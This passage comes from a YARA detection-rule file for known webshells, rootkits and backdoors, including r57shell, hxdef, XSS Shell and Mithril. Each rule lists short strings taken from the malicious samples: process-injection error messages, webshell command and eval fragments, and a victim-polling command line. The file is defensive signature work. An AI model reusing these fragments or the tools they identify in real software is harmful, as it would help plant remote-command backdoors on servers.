		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8183-L8201"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "017191562d72ab0ca551eb89256650bd"
		logic_hash = "5d19eb4132a0401d226c9cffc927b2838e9c69428746296b55a488d097759587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "OpenProcess error!"
		$s1 = "WriteProcessMemory error!"
		$s4 = "GetProcAddress error!"
		$s5 = "HHt`HHt\\"
		$s6 = "Cmaudi0"
		$s7 = "CreateRemoteThread error!"
		$s8 = "Kernel32"
		$s9 = "VirtualAllocEx error!"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hxdef100_2 {
    meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1f079b73-29de-50cf-868c-1639a43e576f"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8202-L8215"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
		logic_hash = "d44131f6c1bfdc36079f474832a79a361dfad96d1b84f7004d682150c93eccc5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"

	condition:
		all of them
}
rule SIGNATURE_BASE_Release_Dlltest {
    meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "af821252-8409-5572-9014-59e8c5feaacd"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8216-L8236"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "76a59fc3242a2819307bb9d593bef2e0"
		logic_hash = "ba759ae1bbde357085b2b2dfda0780b5a239a44b4e999244e8eceed246090ce3"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = ";;;Y;`;d;h;l;p;t;x;|;"
		$s1 = "0 0&00060K0R0X0f0l0q0w0"
		$s2 = ": :$:(:,:0:4:8:D:`=d="
		$s3 = "4@5P5T5\\5T7\\7d7l7t7|7"
		$s4 = "1,121>1C1K1Q1X1^1e1k1s1y1"
		$s5 = "9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9"
		$s6 = "0)0O0\\0a0o0\"1E1P1q1"
		$s7 = "<.<I<d<h<l<p<t<x<|<"
		$s8 = "3&31383>3F3Q3X3`3f3w3|3"
		$s9 = "8@;D;H;L;P;T;X;\\;a;9=W=z="

	condition:
		all of them
}
rule SIGNATURE_BASE_Webadmin {
    meta:
		description = "Webshells Auto-generated - file webadmin.php"
		author = "Florian Roth (Nextron Systems)"
		id = "615d87f8-9094-5994-aea1-d7276623fbca"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8237-L8248"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3a90de401b30e5b590362ba2dde30937"
		logic_hash = "6e215c3d8b8357b839416ee6951f7739387bb94aa1284ea7e827ae2205221294"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"

	condition:
		all of them
}
rule SIGNATURE_BASE_Commands {
    meta:
		description = "Webshells Auto-generated - file commands.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7cffefc7-4f24-5908-82a4-f11eda398377"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8249-L8261"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "174486fe844cb388e2ae3494ac2d1ec2"
		logic_hash = "5251ee090934c8f99a8a2ffef2605593943306937dc56a135a47f1da7e732587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hkdoordll {
    meta:
		description = "Webshells Auto-generated - file hkdoordll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "c4cfb575-89c3-5a72-8bf5-234d4284fe9d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8262-L8273"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b715c009d47686c0e62d0981efce2552"
		logic_hash = "a3c4d262b59cdf82390c0457810505e9e7a18c9b26ba4524bc368fd2141ec306"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"

	condition:
		all of them
}
rule SIGNATURE_BASE_R57Shell_2 {
    meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3a3fe11-c9e1-523b-88a3-ddc0c1085d04"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8274-L8285"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "5319426928d33b62527efb561c2b7a226a5a473735f501b267e6b3b174972085"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"

	condition:
		all of them
}
rule SIGNATURE_BASE_Mithril_V1_45_Dlltest {
    meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "2aea84b6-1b51-58cd-b52b-c31b1f75d295"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8286-L8299"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1b9e518aaa62b15079ff6edb412b21e9"
		logic_hash = "cf1e2ca39ae6b726792bbbaf0f1dd90788a4bb9ba5e3d50c22d75f2b3d4e9e7d"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "syspath"
		$s4 = "\\Mithril"
		$s5 = "--list the services in the computer"

	condition:
		all of them
}
rule SIGNATURE_BASE_Dbgiis6Cli {
    meta:
		description = "Webshells Auto-generated - file dbgiis6cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "2bc59a6b-f45c-5e68-a346-ac56e8f2757b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8300-L8312"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3044dceb632b636563f66fee3aaaf8f3"
		logic_hash = "f6de3c9b8fbcca230540d1b41659ab02c9548df69f53fa9d5730ac7bb7dfe88a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
		$s5 = "###command:(NO more than 100 bytes!)"

	condition:
		all of them
}
rule SIGNATURE_BASE_Remview_2003_04_22 {
    meta:
		description = "Webshells Auto-generated - file remview_2003_04_22.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3088ee27-42a3-5140-98de-ab6f87c7748b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8313-L8324"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "17d3e4e39fbca857344a7650f7ea55e3"
		logic_hash = "2957f6ec7a022ac04759724276f6928625708346903597b0765b5e81207fc6b9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Test {
    meta:
		description = "Webshells Auto-generated - file test.php"
		author = "Florian Roth (Nextron Systems)"
		id = "b0cc5a2a-c741-50dd-854f-5a43769e8f47"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8325-L8337"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "82cf7b48da8286e644f575b039a99c26"
		logic_hash = "62613bead716717f116290b1c9eca9aa63eadd280050811e30a54e5d186af2fc"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$yazi = \"test\" . \"\\r\\n\";"
		$s2 = "fwrite ($fp, \"$yazi\");"

	condition:
		all of them
}
rule SIGNATURE_BASE_Debug_Cress {
    meta:
		description = "Webshells Auto-generated - file cress.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6cf3e43c-bec1-5688-b1d7-8ac48d59153a"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8338-L8350"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "36a416186fe010574c9be68002a7286a"
		logic_hash = "670e236e72d3cb52ea5dba865749baee58a70f8d100db1dd8eddfe3183339181"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\Mithril "
		$s4 = "Mithril.exe"

	condition:
		all of them
}
rule SIGNATURE_BASE_Webshell {
    meta:
		description = "Webshells Auto-generated - file webshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8351-L8366"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "f2f8c02921f29368234bfb4d4622ad19"
		logic_hash = "e3fdce426d2f6e88d8e9412a3026ea05d027af934763eafe0188602458c2289d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RhViRYOzz"
		$s1 = "d\\O!jWW"
		$s2 = "bc!jWW"
		$s3 = "0W[&{l"
		$s4 = "[INhQ@\\"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_EFSO_2 {
    meta:
		description = "Webshells Auto-generated - file EFSO_2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e88d324c-1dee-5b07-b528-cf760e3ee7a6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8367-L8379"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		logic_hash = "462c713e5d4fb6d0db91b14bfacdca73f780559ba2dad80988c356ee1a3d369d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
		$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"

	condition:
		all of them
}
rule SIGNATURE_BASE_Thelast_Index3 {
    meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41310217-b9a7-5360-80c4-7d0a3969f848"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8380-L8391"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cceff6dc247aaa25512bad22120a14b4"
		logic_hash = "3700141ca2cf53f49618e2d4cab8866efccdce843921f1733b3d6260b8feea68"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"

	condition:
		all of them
}
rule SIGNATURE_BASE_Adjustcr {
    meta:
		description = "Webshells Auto-generated - file adjustcr.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4b3d9409-60e8-502a-b37b-1e06d57c9b0b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8392-L8406"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "17037fa684ef4c90a25ec5674dac2eb6"
		logic_hash = "d2a86083ff5cb34a0453f812e2d316c63342e529f00099a8869fa7e0a43321ef"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$Info: This file is packed with the UPX executable packer $"
		$s2 = "$License: NRV for UPX is distributed under special license $"
		$s6 = "AdjustCR Carr"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}
rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Xishell {
    meta:
		description = "Webshells Auto-generated - file xIShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "32a32a9a-8d5f-5b3f-8ff4-560555f0ae1e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8407-L8418"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "997c8437c0621b4b753a546a53a88674"
		logic_hash = "13393bc72477ab9a4ebc16b409de8ed73e086cc41f25f34315d11401b63c2471"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"

	condition:
		all of them
}
rule SIGNATURE_BASE_Hytop_Apppack_2005 {
    meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "67c86d16-a962-5502-8c39-0a6e3dc04031"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8419-L8430"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "0de4800291132efca24b40bebcc895d6873110214c8cbf8384317208e0d9db82"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"

	condition:
		all of them
}
rule SIGNATURE_BASE_Xssshell {
    meta:
		description = "Webshells Auto-generated - file xssshell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ef89653c-5814-525a-b04e-4326a80f780c"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8431-L8442"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
		logic_hash = "6b0e602b523f58ec61850b4ba2e69da4fe4bf2833fb45e529785a398445db127"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"

	condition:
		all of them
}
rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Usr {
    meta:
		description = "Webshells Auto-generated - file usr.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ab1825fe-96aa-5d97-acd6-eac43a12b237"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8443-L8454"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ade3357520325af50c9098dc8a21a024"
		logic_hash = "f5fd4a4c1b531b23b09505d302dc27d7ba2eb733fcf313c04ba9085b090f7cbe"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"

	condition:
		all of them
}
rule SIGNATURE_BASE_FSO_S_Phpinj {
    meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5d84d518-0e18-517f-890b-e296ac265c50"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8455-L8466"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "de4ac200f5426ec4c6fef21d5fbc37281811569a3e71a9bcb6fa51d13eb600a4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"

	condition:
		all of them
}
rule SIGNATURE_BASE_Xssshell_Db {
    meta:
		description = "Webshells Auto-generated - file db.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "94bb2297-95a2-5442-bb16-fb079a29606e"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8467-L8478"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "cb62e2ec40addd4b9930a9e270f5b318"
		logic_hash = "3fdbaa17c12abef8576bf859065d90f4b6e80c187af734b71b26a1bd5d073e86"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"

	condition:
		all of them
}
rule SIGNATURE_BASE_PHP_Sh {
    meta:
		description = "Webshells Auto-generated - file sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8479-L8490"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1e9e879d49eb0634871e9b36f99fe528"
		logic_hash = "da0b572f116cc5c55e8d7469f222896d602d09be4761a0e2139fc8ce67ac4050"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"

	condition:
		all of them
}
rule SIGNATURE_BASE_Xssshell_Default {
    meta:
		description = "Webshells Auto-generated - file default.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "1c221572-4cb5-5806-a856-0f857dba230a"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8491-L8502"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d156782ae5e0b3724de3227b42fcaf2f"
		logic_hash = "6a8772a8a6399c3266abcc22a3c55eda70ec9703346398f5f1768bbd35974f8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"

	condition:
		all of them
}
rule SIGNATURE_BASE_Editserver_2 {
    meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bd254bd9-fd23-5807-9347-2a559089b7c5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8503-L8516"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
		logic_hash = "c581936928ce0f1061feb5665c743f14f12a9f875e360f40cc064f3047b23adf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@HOTMAIL.COM"
		$s1 = "Press Any Ke"
		$s3 = "glish MenuZ"

	condition:
		all of them
}
rule SIGNATURE_BASE_By064Cli {
    meta:
		description = "Webshells Auto-generated - file by064cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9ea88f0c-9275-5567-a4d9-0545de8044d1"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8517-L8529"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "10e0dff366968b770ae929505d2a9885"
		logic_hash = "51efd5c510efc6657ae175af47b09437ae70eb0237d88ffdf3cdae365d0ec7be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "packet dropped,redirecting"
		$s9 = "input the password(the default one is 'by')"

	condition:
		all of them
}
rule SIGNATURE_BASE_Mithril_Dlltest {
    meta:
		description = "Webshells Auto-generated - file dllTest.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "59a6bfb6-c099-56cd-b40e-3e92ea0eb7d3"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8530-L8542"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a8d25d794d8f08cd4de0c3d6bf389e6d"
		logic_hash = "c8c8d1b75ed4eb4bc66a762e53aa6b3ab439e96ef464a8b9ffa4dff887986465"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "please enter the password:"
		$s3 = "\\dllTest.pdb"

	condition:
		all of them
}
rule SIGNATURE_BASE_Peek_A_Boo {
    meta:
		description = "Webshells Auto-generated - file peek-a-boo.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "f6ca33b5-e37f-5124-a193-a3056c559314"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8543-L8559"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "aca339f60d41fdcba83773be5d646776"
		logic_hash = "b103c1b873dd0df9626d72a1127fbadc821777a05012a080423263a2083c398b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "__vbaHresultCheckObj"
		$s1 = "\\VB\\VB5.OLB"
		$s2 = "capGetDriverDescriptionA"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s8 = "__vbaErrorOverflow"

	condition:
		all of them
}
rule SIGNATURE_BASE_Fmlibraryv3 {
    meta:
		description = "Webshells Auto-generated - file fmlibraryv3.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9b8ef79d-80bb-5a05-91e6-0f2bc3fd3068"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/thor-webshells.yar#L8560-L8571"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
